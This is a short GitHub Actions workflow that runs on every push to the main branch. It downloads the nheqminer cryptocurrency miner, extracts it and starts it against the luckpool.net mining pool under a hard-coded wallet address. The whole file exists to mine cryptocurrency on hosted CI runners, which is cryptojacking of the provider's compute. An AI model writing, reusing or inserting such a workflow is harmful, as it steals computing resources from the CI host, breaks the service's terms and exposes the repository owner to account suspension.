name: Run nheqminer

on:
  push:
    branches:
      - main  # Adjust this to your target branch

jobs:
  run-nheqminer:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Install wget and tar
        run: sudo apt-get update && sudo apt-get install -y wget tar

      - name: Download nheqminer
        run: |
          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz

      - name: Extract nheqminer
        run: |
          tar -xvf nheqminer-Linux-v0.8.2.tgz
          ls -la  # List contents to check the extracted files

      - name: Run nheqminer
        run: |
          # Adjust this if the extracted directory name is different
          cd nheqminer-Linux-v0.8.2
          ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
